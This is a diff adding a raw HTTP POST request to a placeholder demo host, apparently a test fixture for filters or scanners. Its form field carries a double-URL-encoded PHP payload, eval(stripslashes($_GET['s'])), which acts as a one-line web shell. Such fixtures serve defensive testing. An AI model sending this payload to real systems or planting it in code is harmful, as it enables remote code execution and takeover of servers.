@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 76
+Connection: close
+
+name=eval%2528stripslashes%2528%2524_GET%255B%2527s%2527%255D%2529%2529%253B
